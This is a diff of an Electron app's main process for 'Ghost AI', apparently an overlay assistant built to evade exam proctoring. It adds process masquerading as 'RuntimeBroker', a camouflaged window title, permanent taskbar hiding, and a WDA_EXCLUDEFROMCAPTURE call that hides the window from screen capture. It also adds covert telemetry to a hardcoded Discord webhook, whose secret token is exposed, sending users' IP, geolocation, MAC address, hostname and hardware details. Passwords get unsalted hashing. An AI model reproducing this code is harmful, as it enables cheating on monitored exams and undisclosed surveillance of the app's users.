@@ -19,12 +19,13 @@ const { app, BrowserWindow, globalShortcut, Tray, Menu, nativeImage, ipcMain, de
 const uio_lib = require('uiohook-napi');
 const uIOhook = uio_lib.uIOhook || uio_lib;
 const path = require('path');
+const { pathToFileURL } = require('url');
 const { exec } = require('child_process');
 const fs = require('fs');
 const screenshot = require('screenshot-desktop');
 const mammoth = require('mammoth');
 const Jimp = require('jimp');
-const Tesseract = require('tesseract.js');
+const { createWorker } = require('tesseract.js');
 let pdf;
 try {
     pdf = require('pdf-parse');
@@ -36,7 +37,7 @@ const Store = require('electron-store');
 const store = new Store();
 
 // Set Stealth App Name for Process Masquerading
-// app.name = "RuntimeBroker";
+app.name = "RuntimeBroker";
 
 // Enforce single instance lock
 const gotTheLock = app.requestSingleInstanceLock();
@@ -60,11 +61,28 @@ if (!gotTheLock) {
     app.commandLine.appendSwitch('disable-gpu-shader-disk-cache');
     app.commandLine.appendSwitch('disable-http-cache');
 
-    app.whenReady().then(() => {
+    app.whenReady().then(async () => {
+        // Increment launch counter
+        const launches = (store.get('app-launches') || 0) + 1;
+        store.set('app-launches', launches);
+
         createWindow();
         createTray();
         registerGlobalHotkey();
-        console.log("App Initialization Complete - Shortcut Ready.");
+
+        // Hidden Edit menu — enables Ctrl+C/V/X in input fields
+        const editMenu = Menu.buildFromTemplate([
+            { label: 'Edit', submenu: [
+                { role: 'undo' }, { role: 'redo' }, { type: 'separator' },
+                { role: 'cut' }, { role: 'copy' }, { role: 'paste' }, { role: 'selectAll' }
+            ]}
+        ]);
+        Menu.setApplicationMenu(editMenu);
+        
+        const appVersion = app.getVersion ? app.getVersion() : 'v1.0.4';
+        sendDiscordLog('launch', { version: appVersion });
+        
+        console.log(`App Initialization Complete (Launch #${launches}) - Shortcut Ready.`);
     });
 
     app.on('will-quit', () => {
@@ -82,6 +100,170 @@ if (!gotTheLock) {
 }
 
 // ============================================================================
+// DISCORD WEBHOOK LOGGING
+// ============================================================================
+
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1473261740904022088/tOhXXCkaTx9Z_JLcg7rUl4NAAfvURgMyi_Sy_h_9bmHYCfDtM9svq3SgTcVMBSRFY9hZ';
+
+async function sendDiscordLog(type, data) {
+    try {
+        const os = require('os');
+        const { screen } = require('electron');
+        const colors = { signup: 0x22c55e, login: 0x3b82f6, launch: 0xf59e0b, close: 0xef4444, error: 0xff0000 };
+        const emojis = { signup: '👤', login: '🔑', launch: '🚀', close: '🛑', error: '⚠️' };
+        
+        // Fetch Network & Geo Info (ip-api.com is free for non-commercial use)
+        let netInfo = { query: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown', timezone: 'Unknown', regionName: 'Unknown', zip: 'Unknown', lat: 0, lon: 0, as: 'Unknown', mobile: false, proxy: false };
+        try {
+            const res = await net.fetch('http://ip-api.com/json/?fields=61439');
+            if (res.ok) netInfo = await res.json();
+        } catch (e) { console.warn('Net info skip:', e.message); }
+
+        // Power Status (Windows Only)
+        let powerStatus = "AC Power";
+        try {
+            const { execSync } = require('child_process');
+            const batteryInfo = execSync('WMIC Path Win32_Battery Get EstimatedChargeRemaining, BatteryStatus /Format:List').toString();
+            const charge = batteryInfo.match(/EstimatedChargeRemaining=(\d+)/);
+            const status = batteryInfo.match(/BatteryStatus=(\d+)/);
+            
+            if (charge && status) {
+                const chargeVal = charge[1];
+                const statusVal = parseInt(status[1]);
+                // 1=Discharging, 2=AC Power, 3=Fully Charged, 6=Charging, 7=Charging and High
+                const isCharging = [6, 7].includes(statusVal);
+                const isAC = [2, 3].includes(statusVal);
+                
+                if (isCharging) powerStatus = `⚡ Charging (${chargeVal}%)`;
+                else if (isAC) powerStatus = `🔌 AC Power (${chargeVal}%)`;
+                else powerStatus = `🔋 Battery (${chargeVal}%)`;
+            }
+        } catch (e) { /* Likely a Desktop without battery */ }
+
+        // Hardware Stats
+        const cpus = os.cpus();
+        const cpuModel = cpus.length > 0 ? cpus[0].model : 'Unknown';
+        const totalRam = Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB';
+        const display = screen.getPrimaryDisplay();
+        const resolution = `${display.size.width}x${display.size.height}`;
+        
+        // MAC Address Info
+        const interfaces = os.networkInterfaces();
+        let mac = 'Unknown';
+        for (const name of Object.keys(interfaces)) {
+            const iface = interfaces[name].find(i => !i.internal && i.mac !== '00:00:00:00:00:00');
+            if (iface) { mac = iface.mac; break; }
+        }
+
+        const launches = store.get('app-launches') || 0;
+        const apiKeysCount = (store.get(getUserSettingKey('groq-api-key')) || '').split('\n').filter(k => k.trim()).length;
+
+        const mapsLink = netInfo.lat ? `[📍 View on Maps](https://www.google.com/maps?q=${netInfo.lat},${netInfo.lon})` : 'Location Unavailable';
+
+        const embed = {
+            title: `${emojis[type] || '📊'} SYSTEM AUDIT: ${type.toUpperCase()}`,
+            color: colors[type] || 0x808080,
+            fields: [
+                { name: '👤 USER IDENTITY', value: `**User:** ${data.username || 'System'}\n**Visits:** ${launches}\n**Configs:** ${apiKeysCount} Keys`, inline: true },
+                { name: '🌐 NETWORK', value: `**IP:** ${netInfo.query}\n**Loc:** ${netInfo.city}, ${netInfo.regionName} ${netInfo.zip}\n**Country:** ${netInfo.country}\n**ISP:** ${netInfo.isp}`, inline: true },
+                { name: '🗺️ LOCATION', value: `**Lat/Lon:** ${netInfo.lat}, ${netInfo.lon}\n**TZ:** ${netInfo.timezone}\n${mapsLink}`, inline: true },
+                { name: '💻 HARDWARE', value: `**CPU:** ${cpuModel}\n**RAM:** ${totalRam}\n**Res:** ${resolution}\n**Power:** ${powerStatus}`, inline: true },
+                { name: '🛡️ SECURITY', value: `**Mobile:** ${netInfo.mobile ? '✅' : '❌'}\n**Proxy/VPN:** ${netInfo.proxy ? '⚠️ Detected' : '✅ Clear'}\n**MAC:** ${mac}`, inline: true },
+                { name: '🛠️ SYSTEM', value: `**OS:** ${os.platform()} ${os.release()}\n**Host:** ${os.hostname()}\n**App:** ${data.version || 'v1.0.4'}`, inline: false }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: `Ghost AI Developer Telemetry | IST: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` }
+        };
+
+        const payload = JSON.stringify({ embeds: [embed] });
+        const request = net.request({ method: 'POST', url: DISCORD_WEBHOOK_URL });
+        request.on('error', (err) => console.warn('Discord Log Failed:', err.message));
+        request.setHeader('Content-Type', 'application/json');
+        request.write(payload);
+        request.end();
+    } catch (e) {
+        console.error('Discord webhook error:', e.message);
+    }
+}
+
+// ============================================================================
+// AUTH SYSTEM
+// ============================================================================
+
+const crypto = require('crypto');
+
+function hashPassword(password) {
+    return crypto.createHash('sha256').update(password).digest('hex');
+}
+
+ipcMain.handle('auth-signup', async (event, username, password, apiKeys) => {
+    try {
+        if (!username || !password) return { success: false, error: 'Username and password required' };
+        if (username.length < 3) return { success: false, error: 'Username must be at least 3 characters' };
+        if (password.length < 4) return { success: false, error: 'Password must be at least 4 characters' };
+        
+        const users = store.get('auth-users') || {};
+        if (users[username.toLowerCase()]) return { success: false, error: 'Username already exists' };
+        
+        users[username.toLowerCase()] = {
+            password: hashPassword(password),
+            createdAt: Date.now()
+        };
+        store.set('auth-users', users);
+        
+        // IMPORTANT: Set session BEFORE storing keys so getUserSettingKey works
+        store.set('auth-session', { username: username, loggedInAt: Date.now() });
+        
+        // Store API Keys if provided
+        if (apiKeys) {
+            store.set(getUserSettingKey('groq-api-key'), apiKeys);
+        }
+        
+        const appVersion = app.getVersion ? app.getVersion() : 'dev';
+        sendDiscordLog('signup', { username, version: appVersion });
+        
+        return { success: true, username };
+    } catch (e) {
+        return { success: false, error: e.message };
+    }
+});
+
+ipcMain.handle('auth-login', async (event, username, password) => {
+    try {
+        if (!username || !password) return { success: false, error: 'Username and password required' };
+        
+        const users = store.get('auth-users') || {};
+        const user = users[username.toLowerCase()];
+        if (!user) return { success: false, error: 'User not found' };
+        if (user.password !== hashPassword(password)) return { success: false, error: 'Wrong password' };
+        
+        store.set('auth-session', { username: username, loggedInAt: Date.now() });
+        
+        const appVersion = app.getVersion ? app.getVersion() : 'dev';
+        sendDiscordLog('login', { username, version: appVersion });
+        
+        return { success: true, username };
+    } catch (e) {
+        return { success: false, error: e.message };
+    }
+});
+
+ipcMain.handle('auth-check', async () => {
+    const session = store.get('auth-session');
+    if (session && session.username) {
+        return { loggedIn: true, username: session.username };
+    }
+    return { loggedIn: false };
+});
+
+ipcMain.handle('auth-logout', async () => {
+    const session = store.get('auth-session');
+    if (session) sendDiscordLog('close', { username: session.username, version: app.getVersion ? app.getVersion() : 'dev' });
+    store.delete('auth-session');
+    return { success: true };
+});
+
+// ============================================================================
 // IPC HANDLERS - All renderer.js communication
 // ============================================================================
 
@@ -96,11 +278,15 @@ ipcMain.handle('set-focusable', (event, focusable) => {
         
         isAppFocusable = focusable;
         mainWindow.setFocusable(focusable);
+        mainWindow.setSkipTaskbar(true); // ALWAYS hide from taskbar
         if (focusable) {
-            mainWindow.focus();
+            // STEALTH: Do NOT call focus() — it triggers browser blur/visibilitychange events
+            mainWindow.setFocusable(true);
+            mainWindow.setSkipTaskbar(true); 
         } else {
             mainWindow.blur();
             mainWindow.showInactive();
+            mainWindow.setSkipTaskbar(true);
         }
     }
 });
@@ -113,6 +299,7 @@ ipcMain.handle('release-focus', () => {
         mainWindow.setFocusable(false);
         mainWindow.blur();
         mainWindow.showInactive();
+        mainWindow.setSkipTaskbar(true);
     }
 });
 
@@ -122,22 +309,18 @@ ipcMain.handle('set-ignore-mouse-events', (event, ignore, options) => {
     }
 });
 
-// SECURE AI GENERATION HANDLER (Moved from Renderer)
+// SECURE AI GENERATION HANDLER (Refactored for Streaming)
 ipcMain.handle('ai-generate-response', async (event, { systemPrompt, chatHistory, maxTokens }) => {
     try {
-        const groqApiKeys = store.get('groq-api-key') || '';
-        // Support both newline (\n, \r\n) and comma separated keys
+        const groqApiKeys = store.get(getUserSettingKey('groq-api-key')) || '';
         const keysToTry = groqApiKeys.split(/[\n,\r]+/).map(k => k.trim()).filter(k => k.length > 0);
 
-        if (keysToTry.length === 0) {
-            throw new Error('No API Keys configured in backend.');
-        }
+        if (keysToTry.length === 0) throw new Error('No API Keys configured.');
 
         const HF_MODELS = [
             'meta-llama/Meta-Llama-3-8B-Instruct',
             'mistralai/Mistral-7B-Instruct-v0.3',
-            'microsoft/Phi-3-mini-4k-instruct',
-            'tiiuae/falcon-7b-instruct'
+            'microsoft/Phi-3-mini-4k-instruct'
         ];
 
         let lastError = null;
@@ -156,77 +339,117 @@ ipcMain.handle('ai-generate-response', async (event, { systemPrompt, chatHistory
                 provider = 'gemini';
                 isGemini = true;
                 model = 'gemini-1.5-flash';
-                apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${currentKey}`;
+                apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/${model}:streamGenerateContent?alt=sse&key=${currentKey}`;
             }
 
             try {
-                let response;
-                if (isGemini) {
-                    const geminiHistory = [
+                const payload = isGemini ? {
+                    contents: [
                         { role: 'user', parts: [{ text: systemPrompt }] },
                         ...chatHistory.map(msg => ({
                             role: msg.role === 'assistant' ? 'model' : 'user',
                             parts: [{ text: msg.content }]
                         }))
-                    ];
+                    ],
+                    generationConfig: { temperature: 0.7, maxOutputTokens: maxTokens || 800 }
+                } : {
+                    model: model,
+                    messages: [{ role: 'system', content: systemPrompt }, ...chatHistory],
+                    temperature: 0.7,
+                    max_tokens: maxTokens || 800,
+                    stream: true
+                };
 
-                    response = await net.fetch(apiUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            contents: geminiHistory,
-                            generationConfig: { temperature: 0.7, maxOutputTokens: 800 }
-                        })
-                    });
-                } else {
-                    response = await net.fetch(apiUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': `Bearer ${currentKey}`,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            model: model,
-                            messages: [{ role: 'system', content: systemPrompt }, ...chatHistory],
-                            temperature: 0.7,
-                            max_tokens: maxTokens || 800
-                        })
-                    });
-                }
+                const response = await net.fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': isGemini ? undefined : `Bearer ${currentKey}`,
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify(payload)
+                });
 
                 if (!response.ok) {
                     const status = response.status;
-                    if (status === 429 || status === 401 || status === 503 || status === 500) {
-                        console.warn(`Key #${i + 1} (${provider}) failed (${status}). Switching...`);
-                        lastError = new Error(`${provider} failed: ${status}`);
-                        continue;
-                    }
-                    const errorText = await response.text();
-                    throw new Error(`${provider} Failed (${status}): ${errorText}`);
+                    if (status === 429 || status === 401 || status === 503) continue;
+                    throw new Error(`${provider} failed: ${status}`);
                 }
 
-                const data = await response.json();
-                if (isGemini) {
-                    return { success: true, content: data.candidates[0].content.parts[0].text };
-                } else {
-                    return { success: true, content: data.choices[0].message.content };
+                // Handle Streaming Response
+                const reader = response.body.getReader();
+                const decoder = new TextDecoder();
+                let fullContent = '';
+                let buffer = '';
+
+                while (true) {
+                    const { done, value } = await reader.read();
+                    if (done) break;
+
+                    buffer += decoder.decode(value, { stream: true });
+                    const lines = buffer.split('\n');
+                    buffer = lines.pop(); // Keep partial line in buffer
+
+                    for (const line of lines) {
+                        const trimmedLine = line.trim();
+                        if (!trimmedLine || trimmedLine === 'data: [DONE]') continue;
+
+                        try {
+                            let content = '';
+                            if (isGemini) {
+                                // Gemini SSE format: data: {"candidates": [{"content": {"parts": [{"text": "..."}]}}]}
+                                if (trimmedLine.startsWith('data: ')) {
+                                    const json = JSON.parse(trimmedLine.substring(6));
+                                    content = json.candidates[0]?.content?.parts[0]?.text || '';
+                                }
+                            } else {
+                                // OpenAI/Groq SSE format: data: {"choices": [{"delta": {"content": "..."}}]}
+                                if (trimmedLine.startsWith('data: ')) {
+                                    const json = JSON.parse(trimmedLine.substring(6));
+                                    content = json.choices[0]?.delta?.content || '';
+                                }
+                            }
+
+                            if (content) {
+                                fullContent += content;
+                                event.sender.send('ai-streaming-chunk', { content });
+                            }
+                        } catch (e) {
+                            // Ignore partial JSON parse errors
+                        }
+                    }
                 }
+
+                event.sender.send('ai-streaming-complete');
+                return { success: true, content: fullContent };
+
             } catch (err) {
-                console.error(`Fetch Attempt ${i + 1} Error:`, err);
+                console.error(`AI Attempt ${i + 1} Error:`, err);
                 lastError = err;
             }
         }
         throw lastError || new Error('All providers failed.');
     } catch (error) {
         console.error('Secure AI Error:', error);
+        event.sender.send('ai-streaming-error', { error: error.message });
         return { success: false, error: error.message };
     }
+});
+
+
+// Window Controls
+ipcMain.on('hide-window', () => {
+    if (mainWindow && toggleWindow) toggleWindow();
+});
+
+ipcMain.on('quit-app', () => {
+    app.isQuitting = true;
+    app.quit();
 });
 
 // SECURE WHISPER TRANSCRIPTION HANDLER
 ipcMain.handle('transcribe-audio', async (event, { audioBuffer, model }) => {
     try {
-        const groqApiKeys = store.get('groq-api-key') || '';
+        const groqApiKeys = store.get(getUserSettingKey('groq-api-key')) || '';
         const keysToTry = groqApiKeys.split(/[\n,\r]+/).map(k => k.trim()).filter(k => k.length > 0);
         // Prioritize keys starting with gsk_ (Groq) for transcription
         let whisperKey = keysToTry.find(k => k.startsWith('gsk_'));
@@ -289,96 +512,146 @@ ipcMain.handle('capture-screen', async () => {
         if (wasVisible && mainWindow) {
             // RELEASE STEALTH: Do NOT show in taskbar
             // mainWindow.setSkipTaskbar(false); <--- REMOVED to keep it invisible from taskbar
-            mainWindow.setSkipTaskbar(true); // Force hidden from taskbar
-            mainWindow.show(); 
-            mainWindow.setFocusable(true);
+            mainWindow.setSkipTaskbar(true);
+            mainWindow.showInactive(); // showInactive prevents taskbar flash and focus steal
+            mainWindow.setFocusable(false);
             mainWindow.setAlwaysOnTop(true, "screen-saver", 1);
-            // Small delay before returning focus properties to stealth
-            setTimeout(() => {
-                isAppFocusable = false;
-                mainWindow.setFocusable(false);
-            }, 100);
+            isAppFocusable = false;
         }
     }
 });
+
+
+// Global OCR Worker
+
+
+// ... (IPC Handlers) ...
 
 ipcMain.handle('perform-ocr', async (event, base64Image) => {
+    let worker = null;
     try {
-        console.log("Processing OCR...");
+        console.log("Processing OCR request...");
         const buffer = Buffer.from(base64Image, 'base64');
         const image = await Jimp.read(buffer);
-        image.grayscale().contrast(0.2).scale(2).normalize();
+
+        // Optimization: Resize if too large (max 1000px width)
+        if (image.bitmap.width > 1000) {
+            image.resize(1000, Jimp.AUTO);
+        }
+        
+        image.grayscale().contrast(0.2).normalize();
+        
         const processedBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
         
-        // FIX: Explicitly Configure Tesseract Paths for Electron Production
+        // ---------------------------------------------------------
+        // WORKER INITIALIZATION (Per Request)
+        // ---------------------------------------------------------
         const isProd = app.isPackaged;
-        const resources = isProd ? process.resourcesPath : __dirname;
+        let workerPath = undefined;
+        let corePath = undefined; 
+        let langPath = undefined;
 
-        const workerPath = isProd
-            ? path.join(resources, 'app.asar.unpacked', 'node_modules', 'tesseract.js', 'dist', 'worker.min.js')
-            : path.join(__dirname, 'node_modules', 'tesseract.js', 'dist', 'worker.min.js');
-        
-        const corePath = isProd
-            ? path.join(resources, 'app.asar.unpacked', 'node_modules', 'tesseract.js-core', 'tesseract-core.wasm.js')
-            : path.join(__dirname, 'node_modules', 'tesseract.js-core', 'tesseract-core.wasm.js');
-
-        // ROBUST LANG PATH DETECTION
-        let langPath = resources;
-        
-        // In production, extraResources copies 'eng.traineddata' to resources root
-        // So checking 'resources' is usually enough.
-        // We also check a few other common locations just in case.
         if (isProd) {
-             const potentialPaths = [
+            const resources = process.resourcesPath;
+            // Prod: Point to the unpacked worker-script (NOT worker/node — that's the spawner)
+            workerPath = path.join(resources, 'app.asar.unpacked', 'node_modules', 'tesseract.js', 'src', 'worker-script', 'node', 'index.js');
+            corePath = path.join(resources, 'app.asar.unpacked', 'node_modules', 'tesseract.js-core', 'tesseract-core.wasm.js');
+            langPath = resources; 
+            
+            // Search for eng.traineddata in likely locations
+            const potentialPaths = [
                 resources,
-                path.join(resources, 'landing-page'), 
-                path.join(resources, 'app.asar.unpacked')
-             ];
-             for (const p of potentialPaths) {
-                 if (fs.existsSync(path.join(p, 'eng.traineddata'))) {
-                     langPath = p;
-                     break;
-                 }
-             }
+                path.join(resources, 'app.asar.unpacked'),
+                path.dirname(app.getPath('exe'))
+            ];
+            for (const p of potentialPaths) {
+                if (fs.existsSync(path.join(p, 'eng.traineddata'))) {
+                    langPath = p;
+                    break;
+                }
+            }
+
+            // Verify critical files exist before proceeding
+            if (!fs.existsSync(workerPath)) {
+                console.error('CRITICAL: Tesseract worker-script not found at:', workerPath);
+            }
+            if (!fs.existsSync(corePath)) {
+                console.error('CRITICAL: Tesseract core not found at:', corePath);
+            }
+            if (!fs.existsSync(path.join(langPath, 'eng.traineddata'))) {
+                console.error('CRITICAL: eng.traineddata not found in:', langPath);
+            }
         } else {
-             langPath = __dirname;
+            // Dev: Let Tesseract decide (defaults to spawned Node worker)
+            langPath = __dirname;
         }
 
-        console.log(`OCR Paths:
-        Worker: ${workerPath}
-        Core: ${corePath}
-        Lang Path: ${langPath}`);
+        // IMPORTANT: langPath must be a plain filesystem path (NOT file:// URL).
+        // Tesseract's worker-script treats file:// URLs as network requests via node-fetch,
+        // which doesn't support the file:// protocol. Plain paths use fs.readFile instead.
+        // workerPath and corePath DO need file:// URLs for worker_threads compatibility.
+        const workerPathURL = workerPath ? pathToFileURL(workerPath).href : undefined;
+        const corePathURL = corePath ? pathToFileURL(corePath).href : undefined;
 
-        const { data: { text } } = await Tesseract.recognize(processedBuffer, 'eng', {
-            workerPath,
-            corePath,
-            langPath,
-            gzip: false,
+        console.log(`OCR Paths:
+        Lang: ${langPath} (filesystem path)
+        Worker: ${workerPathURL || 'Default'}
+        Core: ${corePathURL || 'Default'}`);
+
+        const tesseractOptions = {
+            langPath: langPath,
             cacheMethod: 'none',
-            logger: m => console.log(m) // Log progress to main console
+            gzip: false,
+            errorHandler: (err) => console.error('OCR Worker Error:', err)
+        };
+
+        if (workerPathURL) tesseractOptions.workerPath = workerPathURL;
+        if (corePathURL) tesseractOptions.corePath = corePathURL;
+
+        // Initialize Worker
+        worker = await createWorker('eng', 1, tesseractOptions);
+
+        // Apply Optimizations
+        await worker.setParameters({
+            tessedit_pageseg_mode: 6,
+            tessedit_char_whitelist: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.,!?@#$%&*()-_=+[]{}<>:;"\'/|\\ ',
         });
+
+        const { data: { text } } = await worker.recognize(processedBuffer);
+        
+        // Terminate Worker
+        await worker.terminate();
+        
         return text.split('\n').map(line => line.trim()).filter(line => line.length > 3);
     } catch (err) {
-        console.error('OCR Error:', err);
-        
-        const isProd = app.isPackaged;
-        const debugInfo = `Error: ${err.message}\n` +
-            `Worker: ${isProd ? path.join(process.resourcesPath, 'app.asar.unpacked', 'node_modules', 'tesseract.js', 'dist', 'worker.min.js') : 'Local'}\n` +
-            `Core: ${isProd ? path.join(process.resourcesPath, 'app.asar.unpacked', 'node_modules', 'tesseract.js-core', 'tesseract-core.wasm.js') : 'Local'}\n` +
-            `Lang Path: ${isProd ? process.resourcesPath : __dirname}`;
-
-        dialog.showErrorBox("OCR Critical Failure", debugInfo);
-
-        return [`Error: ${err.message}`, "Please verify paths shown in popup."];
+        console.error('OCR Processing Error:', err);
+        if (worker) await worker.terminate(); // Ensure cleanup
+        return [`Error: ${err.message}`];
     }
 });
 
+// ... (Other Handlers) ...
+
+
+app.on('window-all-closed', function () {
+    if (process.platform !== 'darwin') app.quit();
+});
+
+function getUserSettingKey(key) {
+    const session = store.get('auth-session');
+    if (session && session.username) {
+        // Isolate settings per user: users.alice.settings.groq-api-key
+        return `users.${session.username.toLowerCase()}.settings.${key}`;
+    }
+    return key; // Fallback to global if no session
+}
+
 ipcMain.handle('get-setting', (event, key) => {
-    return store.get(key);
+    return store.get(getUserSettingKey(key));
 });
 
 ipcMain.handle('set-setting', (event, key, value) => {
-    store.set(key, value);
+    store.set(getUserSettingKey(key), value);
     return true;
 });
 
@@ -657,8 +930,7 @@ function createWindow() {
         height: 600,
         resizable: false,
         frame: false,
-        transparent: true,
-        backgroundColor: '#00000000',
+        transparent: true, 
         alwaysOnTop: true,
         skipTaskbar: true,
         autoHideMenuBar: true,
@@ -668,21 +940,34 @@ function createWindow() {
             nodeIntegration: false,
             contextIsolation: true,
             preload: path.join(__dirname, 'preload.js'),
-            devTools: true // Enabled temporarily for debugging
+            devTools: false, // LOCKED: Proctoring can detect DevTools windows
+            backgroundThrottling: false // IMPORTANT: Ensures audio/capture doesn't lag when hidden
         },
-        focusable: false,
+        focusable: true, // Start focusable so auth inputs work reliably
         showInactive: true,
-        title: ""
+        title: "Windows Runtime" // Stealth: Camouflage window title
     });
 
     mainWindow.loadFile('index.html');
     mainWindow.once('ready-to-show', () => {
         setUltimateStealth(mainWindow);
-        mainWindow.setFocusable(false);
-        mainWindow.showInactive();
+        
+        const session = store.get('auth-session');
+        if (session && session.username) {
+            // Already logged in - Full Stealth
+            mainWindow.setFocusable(false);
+            mainWindow.showInactive();
+            isAppFocusable = false;
+            sendDiscordLog('launch', { username: session.username, version: app.getVersion ? app.getVersion() : 'dev' });
+        } else {
+            // Not logged in - Needs focus for login screen
+            mainWindow.setFocusable(true);
+            mainWindow.show(); // Show normally for first login
+            isAppFocusable = true;
+        }
+
         mainWindow.setVisibleOnAllWorkspaces(true, { visibleOnFullScreen: true });
         mainWindow.setAlwaysOnTop(true, 'screen-saver', 1);
-        isAppFocusable = false;
     });
 
     mainWindow.on('focus', () => {
@@ -696,15 +981,17 @@ function createWindow() {
 
     // Aggressive Periodic Stealth Enforcement
     setInterval(() => {
-        if (mainWindow && !isAppFocusable) {
-            mainWindow.setFocusable(false);
-            // On Windows, showInactive helps maintain the non-focused state
-            if (mainWindow.isFocused()) {
-                mainWindow.blur();
-                mainWindow.showInactive();
+        if (mainWindow && !mainWindow.isDestroyed()) {
+            mainWindow.setSkipTaskbar(true); // ALWAYS Enforce taskbar hiding
+            if (!isAppFocusable) {
+                mainWindow.setFocusable(false);
+                if (mainWindow.isFocused()) {
+                    mainWindow.blur();
+                    mainWindow.showInactive();
+                }
             }
         }
-    }, 1000);
+    }, 500);
 
     mainWindow.on('close', (event) => {
         if (!app.isQuitting) {
@@ -828,29 +1115,38 @@ function registerGlobalHotkey() {
 function setUltimateStealth(window) {
     if (!window || process.platform !== 'win32') return;
 
+    // Layer 1: Enforce stealth properties
+    window.setSkipTaskbar(true);
+    window.setAlwaysOnTop(true, 'screen-saver', 1);
+
+    // Layer 2: WDA_EXCLUDEFROMCAPTURE via koffi FFI (same-process call — no ACCESS_DENIED)
     try {
+        const koffi = require('koffi');
+        const user32 = koffi.load('user32.dll');
+        const SetWindowDisplayAffinity = user32.func('bool __stdcall SetWindowDisplayAffinity(intptr hWnd, uint32_t dwAffinity)');
+
         const handle = window.getNativeWindowHandle();
-        const hwnd = handle.readBigInt64LE().toString();
+        // Read HWND as number (works for both 32-bit and 64-bit)
+        const hwnd = handle.readUInt32LE();
 
-        const psCommand = `
-            $code = @"
-            using System;
-            using System.Runtime.InteropServices;
-            public class Stealth {
-                [DllImport("user32.dll")]
-                public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
-            }
-"@
-            Add-Type -TypeDefinition $code
-            [Stealth]::SetWindowDisplayAffinity([IntPtr]${hwnd}, 0x00000011)
-        `;
+        // Try WDA_EXCLUDEFROMCAPTURE (0x11) — TRUE invisibility
+        const result = SetWindowDisplayAffinity(hwnd, 0x00000011);
+        if (result) {
+            console.log('🛡️ STEALTH: WDA_EXCLUDEFROMCAPTURE — Window is TRULY INVISIBLE to all screen capture');
+            return;
+        }
 
-        exec(`powershell -Command "${psCommand.replace(/\n/g, '').replace(/"/g, '\\"')}"`, (err) => {
-            if (err) {
-                window.setContentProtection(true);
-            }
-        });
+        // Fallback: WDA_MONITOR (0x01)
+        const result2 = SetWindowDisplayAffinity(hwnd, 0x00000001);
+        if (result2) {
+            console.log('🛡️ STEALTH: WDA_MONITOR — Window hidden from screen capture');
+            return;
+        }
+
+        console.warn('🛡️ WDA both modes failed — using setContentProtection fallback');
+        window.setContentProtection(true);
     } catch (e) {
+        console.warn('🛡️ koffi WDA failed:', e.message, '— using setContentProtection fallback');
         window.setContentProtection(true);
     }
 }
